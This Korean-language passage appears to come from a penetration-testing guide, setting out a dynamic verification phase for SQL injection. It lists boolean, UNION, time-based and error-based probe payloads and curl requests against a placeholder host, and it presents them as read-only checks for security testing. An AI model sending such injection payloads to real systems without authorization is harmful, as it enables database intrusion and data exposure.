### Phase 2: 동적 테스트 (검증)


**테스트 방법:**
1. curl로 SQL Injection 페이로드가 포함된 요청을 전송
2. 응답에서 SQL 에러 메시지, 데이터 유출, 또는 비정상적인 동작을 확인

**안전한 페이로드 (읽기 전용, 데이터 변경 없음):**

Classic SQLi 테스트:
- `' OR '1'='1` — 기본 Boolean 테스트
- `' OR '1'='1' --` — 주석으로 나머지 쿼리 무효화
- `1 UNION SELECT NULL,NULL,NULL --` — 컬럼 수 확인
- `' AND 1=1 --` / `' AND 1=2 --` — Boolean 기반 (응답 차이 비교)

Blind SQLi 테스트:
- `' AND SLEEP(3) --` (MySQL) — 시간 기반
- `' AND pg_sleep(3) --` (PostgreSQL) — 시간 기반
- `'; WAITFOR DELAY '0:0:3' --` (MSSQL) — 시간 기반

Error 기반:
- `'` — 단일 따옴표로 SQL 에러 유발 여부 확인
- `1'` — 숫자 파라미터에 따옴표 삽입

**curl 예시:**
```
# 기본 Boolean 테스트
curl "https://target.com/api/users?id=1'+OR+'1'%3D'1"

# 시간 기반 Blind 테스트
curl "https://target.com/api/users?id=1'+AND+SLEEP(3)+--+"

# 에러 유발 테스트
curl "https://target.com/api/users?id=1'"
```

**검증 기준:**
- **확인됨**: 동적 테스트로 SQL 에러 메시지가 반환되거나 Boolean/Time 기반으로 쿼리 조작이 확인됨
